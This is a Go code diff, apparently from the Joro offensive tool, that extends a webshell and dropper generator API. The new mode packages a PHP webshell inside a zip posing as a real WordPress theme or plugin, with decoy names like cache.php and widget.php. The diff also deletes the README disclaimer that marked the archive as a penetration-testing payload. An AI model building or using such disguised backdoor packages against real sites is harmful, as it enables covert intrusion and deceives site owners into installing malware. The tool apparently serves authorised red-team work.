@@ -6,21 +6,43 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
+	"io/fs"
 	"net/http"
 	"net/url"
+	"path/filepath"
 	"strings"
 
 	"github.com/BishopFox/joro/internal/shell"
+	"github.com/BishopFox/joro/internal/templates"
 )
 
+const (
+	WPThemeArchiveRoot      = "envo-royal"
+	WPPluginArchiveRoot     = "wp-ajaxify-comments"
+	WPThemeArchive          = "envo-royal.1.0.14.zip"
+	WPPluginArchive         = "wp-ajaxify-comments.3.2.2.zip"
+	WPThemePayloadFileName  = "cache.php"
+	WPPluginPayloadFileName = "widget.php"
+	WPThemePayloadPath      = "php"
+	WPPluginPayloadPath     = "php"
+)
+
+// GenerateRequest represents the body payload of a shell or dropper generation request.
+type GenerateRequest struct {
+	Format             string `json:"format"`
+	Mode               string `json:"mode"`       // "webshell" (default) | "dropper" | "wordpress"
+	ImplantURL         string `json:"implantUrl"` // required when mode=dropper
+	BinaryName         string `json:"binaryName"` // required when mode=dropper && !inMemory
+	InMemory           bool   `json:"inMemory"`   // execute in memory without writing to disk
+	HarpyToken         string `json:"harpyToken"`
+	PayloadFileName    string `json:"payloadFileName"`
+	WPArchiveName      string `json:"archiveName"`
+	WPPayloadDirectory string `json:"payloadDirectory"`
+	WPArchiveRootDir   string `json:"archiveRootDir"`
+}
+
 func (s *APIServer) handleGenerate(w http.ResponseWriter, r *http.Request) {
-	var body struct {
-		Format     string `json:"format"`
-		Mode       string `json:"mode"`       // "webshell" (default) | "dropper"
-		ImplantURL string `json:"implantUrl"` // required when mode=dropper
-		BinaryName string `json:"binaryName"` // required when mode=dropper && !inMemory
-		InMemory   bool   `json:"inMemory"`   // execute in memory without writing to disk
-	}
+	var body GenerateRequest
 	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
 		writeError(w, http.StatusBadRequest, "invalid JSON")
 		return
@@ -32,18 +54,55 @@ func (s *APIServer) handleGenerate(w http.ResponseWriter, r *http.Request) {
 		mode = "webshell"
 	}
 
-	// We treat Custom A and Custom B as regular webshell generation modes,
-	// but we apply packaging to the output.
+	if mode != "webshell" && mode != "dropper" && mode != "wordpress" {
+		writeError(w, http.StatusBadRequest, fmt.Sprintf("unsupported mode %q; use webshell, dropper, or wordpress", mode))
+		return
+	}
+
 	packaging := "none"
-	switch mode {
-	case "custom_a":
-		packaging = "custom_a"
-	case "custom_b":
-		packaging = "custom_b"
+	if mode == "wordpress" {
+		packaging = format
+		// Force underlying format to php for package mode
+		format = "php"
+
+		// Pre-determine default values based on packaging type to avoid nested conditions
+		var defaultPayloadDir string
+		var defaultArchiveName string
+		var defaultArchiveRootDir string
+		var defaultPayloadFileName string
+
+		switch packaging {
+		case "theme":
+			defaultPayloadDir = WPThemePayloadPath
+			defaultArchiveName = WPThemeArchive
+			defaultArchiveRootDir = WPThemeArchiveRoot
+			defaultPayloadFileName = WPThemePayloadFileName
+		case "plugin":
+			defaultPayloadDir = WPPluginPayloadPath
+			defaultArchiveName = WPPluginArchive
+			defaultArchiveRootDir = WPPluginArchiveRoot
+			defaultPayloadFileName = WPPluginPayloadFileName
+		default:
+			writeError(w, http.StatusBadRequest, fmt.Sprintf("unsupported wordpress package type %q; use theme or plugin", packaging))
+			return
+		}
+
+		if body.PayloadFileName == "" {
+			body.PayloadFileName = defaultPayloadFileName
+		}
+		if body.WPPayloadDirectory == "" {
+			body.WPPayloadDirectory = defaultPayloadDir
+		}
+		if body.WPArchiveName == "" {
+			body.WPArchiveName = defaultArchiveName
+		}
+		if body.WPArchiveRootDir == "" {
+			body.WPArchiveRootDir = defaultArchiveRootDir
+		}
 	}
 
 	if mode == "dropper" {
-		s.handleGenerateDropper(w, format, body.ImplantURL, body.BinaryName, body.InMemory)
+		s.handleGenerateDropper(w, format, body.ImplantURL, body.BinaryName, body.InMemory, body.HarpyToken)
 		return
 	}
 
@@ -83,10 +142,17 @@ func (s *APIServer) handleGenerate(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	finalContent, finalName, err := applyPackaging(content, "joro."+ext, packaging)
-	if err != nil {
-		writeError(w, http.StatusInternalServerError, fmt.Sprintf("packaging shell: %v", err))
-		return
+	fileName := "joro." + ext
+	var finalContent = content
+	var finalName = fileName
+
+	if mode == "wordpress" {
+		var err error
+		finalContent, finalName, err = handleGenerateWordPressPack(content, body.PayloadFileName, packaging, body.WPArchiveName, body.WPPayloadDirectory, body.WPArchiveRootDir)
+		if err != nil {
+			writeError(w, http.StatusInternalServerError, fmt.Sprintf("packaging shell: %v", err))
+			return
+		}
 	}
 
 	writeJSON(w, http.StatusOK, map[string]string{
@@ -96,7 +162,7 @@ func (s *APIServer) handleGenerate(w http.ResponseWriter, r *http.Request) {
 	})
 }
 
-func (s *APIServer) handleGenerateDropper(w http.ResponseWriter, format, implantURL, binaryName string, inMemory bool) {
+func (s *APIServer) handleGenerateDropper(w http.ResponseWriter, format, implantURL, binaryName string, inMemory bool, harpyToken string) {
 	// Validate implant URL
 	implantURL = strings.TrimSpace(implantURL)
 	if implantURL == "" {
@@ -126,22 +192,22 @@ func (s *APIServer) handleGenerateDropper(w http.ResponseWriter, format, implant
 
 	switch format {
 	case "php":
-		content, authKey, err = shell.GenerateDropperPHP(implantURL, binaryName, inMemory)
+		content, authKey, err = shell.GenerateDropperPHP(implantURL, binaryName, inMemory, harpyToken)
 		ext = "php"
 	case "asp":
-		content, authKey, err = shell.GenerateDropperASP(implantURL, binaryName, inMemory)
+		content, authKey, err = shell.GenerateDropperASP(implantURL, binaryName, inMemory, harpyToken)
 		ext = "asp"
 	case "aspx":
-		content, authKey, err = shell.GenerateDropperASPX(implantURL, binaryName, inMemory)
+		content, authKey, err = shell.GenerateDropperASPX(implantURL, binaryName, inMemory, harpyToken)
 		ext = "aspx"
 	case "ashx":
-		content, authKey, err = shell.GenerateDropperASHX(implantURL, binaryName, inMemory)
+		content, authKey, err = shell.GenerateDropperASHX(implantURL, binaryName, inMemory, harpyToken)
 		ext = "ashx"
 	case "jsp":
-		content, authKey, err = shell.GenerateDropperJSP(implantURL, binaryName, inMemory)
+		content, authKey, err = shell.GenerateDropperJSP(implantURL, binaryName, inMemory, harpyToken)
 		ext = "jsp"
 	case "cfm":
-		content, authKey, err = shell.GenerateDropperCFM(implantURL, binaryName, inMemory)
+		content, authKey, err = shell.GenerateDropperCFM(implantURL, binaryName, inMemory, harpyToken)
 		ext = "cfm"
 	default:
 		writeError(w, http.StatusBadRequest, fmt.Sprintf("unsupported format %q; use asp, ashx, aspx, cfm, jsp, or php", format))
@@ -160,15 +226,50 @@ func (s *APIServer) handleGenerateDropper(w http.ResponseWriter, format, implant
 	})
 }
 
-func applyPackaging(content, originalFileName, packaging string) (string, string, error) {
-	if packaging != "custom_a" && packaging != "custom_b" {
-		return content, originalFileName, nil
+func handleGenerateWordPressPack(content, payloadFileName, wpType, archiveName, payloadDirectory, archiveRootDir string) (string, string, error) {
+	if wpType != "theme" && wpType != "plugin" {
+		return content, payloadFileName, nil
+	}
+
+	// Reject path traversal attempts for zip entry paths
+	if strings.Contains(payloadFileName, "..") {
+		return "", "", fmt.Errorf("payload filename cannot contain path traversal components")
+	}
+	if strings.Contains(payloadDirectory, "..") {
+		return "", "", fmt.Errorf("payload directory cannot contain path traversal components")
+	}
+	if strings.Contains(archiveRootDir, "..") {
+		return "", "", fmt.Errorf("archive root directory cannot contain path traversal components")
+	}
+
+	// Sanitize and normalize relative paths inside the zip archive (must use forward slashes)
+	payloadDirectory = filepath.ToSlash(filepath.Clean(payloadDirectory))
+	if payloadDirectory == "." || payloadDirectory == "/" {
+		payloadDirectory = ""
+	} else if payloadDirectory != "" {
+		payloadDirectory = strings.Trim(payloadDirectory, "/") + "/"
+	}
+
+	archiveRootDir = filepath.ToSlash(filepath.Clean(archiveRootDir))
+	if archiveRootDir == "." || archiveRootDir == "/" {
+		archiveRootDir = ""
+	} else if archiveRootDir != "" {
+		archiveRootDir = strings.Trim(archiveRootDir, "/") + "/"
 	}
 
 	var buf bytes.Buffer
 	zw := zip.NewWriter(&buf)
 
-	fw, err := zw.Create(originalFileName)
+	if payloadDirectory != "" {
+		if !strings.HasPrefix(payloadFileName, payloadDirectory) {
+			payloadFileName = payloadDirectory + payloadFileName
+		}
+	}
+	if archiveRootDir != "" {
+		payloadFileName = archiveRootDir + payloadFileName
+	}
+
+	fw, err := zw.Create(payloadFileName)
 	if err != nil {
 		return "", "", err
 	}
@@ -176,12 +277,44 @@ func applyPackaging(content, originalFileName, packaging string) (string, string
 		return "", "", err
 	}
 
-	rw, err := zw.Create("README.txt")
+	templateDir := "wp_" + wpType
+
+	// Add the embedded files from internal/templates
+	err = fs.WalkDir(templates.PackageFS, templateDir, func(path string, d fs.DirEntry, err error) error {
+		if err != nil {
+			return err
+		}
+		if d.IsDir() {
+			return nil
+		}
+
+		// Read file from embed.FS
+		fileContent, err := templates.PackageFS.ReadFile(path)
+		if err != nil {
+			return err
+		}
+
+		// Calculate relative path within the zip, stripping the template root folder
+		relPath, err := filepath.Rel(templateDir, path)
+		if err != nil {
+			return err
+		}
+
+		if archiveRootDir != "" {
+			relPath = archiveRootDir + relPath
+		}
+
+		zwFile, err := zw.Create(relPath)
+		if err != nil {
+			return err
+		}
+		if _, err := zwFile.Write(fileContent); err != nil {
+			return err
+		}
+		return nil
+	})
+
 	if err != nil {
-		return "", "", err
-	}
-	disclaimer := "This archive was generated by Joro for penetration testing purposes and contains a payload.\n"
-	if _, err := rw.Write([]byte(disclaimer)); err != nil {
 		return "", "", err
 	}
 
@@ -189,8 +322,20 @@ func applyPackaging(content, originalFileName, packaging string) (string, string
 		return "", "", err
 	}
 
-	parts := strings.Split(originalFileName, ".")
-	newFileName := parts[0] + ".zip"
+	if archiveName == "" {
+		switch wpType {
+		case "theme":
+			archiveName = WPThemeArchive
+		case "plugin":
+			archiveName = WPPluginArchive
+		default:
+			parts := strings.Split(filepath.Base(payloadFileName), ".")
+			archiveName = parts[0] + ".zip"
+		}
+	}
+	if !strings.HasSuffix(archiveName, ".zip") {
+		archiveName += ".zip"
+	}
 
-	return buf.String(), newFileName, nil
+	return buf.String(), archiveName, nil
 }
